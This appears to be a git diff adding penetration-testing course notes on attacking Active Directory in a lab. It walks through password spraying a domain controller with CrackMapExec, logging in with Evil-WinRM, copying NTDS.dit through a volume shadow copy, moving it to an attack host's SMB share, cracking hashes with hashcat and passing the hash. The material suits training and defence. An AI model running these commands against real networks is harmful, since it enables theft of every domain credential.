@@ -576,3 +576,106 @@ We will get an output
 ```
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
+
+# Attacking Active Directory & NTDS.dit
+
+- **Definition**: Critical directory service in enterprise networks, primarily for managing Windows systems.
+- **Importance**: Extensive topic; multiple modules cover attacking and defending AD environments.
+
+
+## Attack Prerequisites
+
+- **Network Reachability**: Target must be accessible over the network.
+- **Internal Foothold**: Typically requires initial compromise to access the internal network.
+- **Remote Access**: Organizations may use port forwarding (e.g., RDP on port 3389) to access internal systems.
+
+### Authentication Process
+
+- Once a Windows system is joined to a domain, it sends all authentication requests to the domain controller, rather than using the SAM database by default.
+- Local account logon is still possible by specifying the hostname (e.g., `WS01/nameofuser`) or using `./` at the logon UI.
+- This is important for understanding which system components are affected by attacks and may provide additional avenues for targeting Windows systems, both with physical access and over the network.
+- Awareness of this technique aids in studying NTDS attacks.
+
+## Dictionary Attacks against AD accounts using CrackMapExec
+Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy.
+
+consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username.  Organisations follow a naming convention.
+
+an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username. Google the domain name , i.e., “@inlanefreight.com” can get some valid emails.
+
+### Creating a Custom list of Usernames
+Create a custom list yourself using the usual convention like the example below.( name - Ben Williamson )
+![image](https://github.com/user-attachments/assets/74060651-89ed-46f2-962a-30eb7638f8b5)
+
+Use automated username generator such as the Ruby-based tool Username Anarchy to convert a list of real names into common username formats. 
+```
+./username-anarchy -i /home/ltnbob/names.txt
+```
+
+### Launching the Attack with CrackMapExec
+Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. 
+```
+ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+CrackMapExec is using SMB to attempt to logon as user (-u) bwilliamson using a password (-p) list containing a list of commonly used passwords (/usr/share/wordlists/fasttrack.txt). This can be countered by account lockout policy. (default it is not enforced)
+
+**Event Logs from the Attack**
+It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged. 
+
+Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.
+
+## Capturing NTDS.dit
+
+NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. 
+
+### Connecting to a DC with Evil-WinRM
+```
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+```
+### Checking Local Group Membership
+check to see what privileges bwilliamson has
+```
+net localgroup
+```
+To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.
+### Checking User Account Privileges including Domain
+```
+net user bwilliamson
+```
+This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
+
+## Creating Shadow Copy of C:
+We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. 
+```
+vssadmin CREATE SHADOW /For=C:
+```
+### Copying NTDS.dit from the VSS
+copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
+
+```
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+use the technique from attacking sam to create an SMB share on our attack host.
+### Transferring NTDS.dit to Attack Host
+```
+ cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+ ```
+## A Faster Method: Using cme to Capture NTDS.dit
+sing CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
+```
+crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
+## Cracking Hashes & Gaining Credentials
+
+### Cracking a Single Hash with Hashcat
+```
+ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+if crack unsuccessful use pass the hash technique.
+## Pass-the-Hash Considerations
+We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login
+
+### Pass-the-Hash with Evil-WinRM Example
+```
+evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
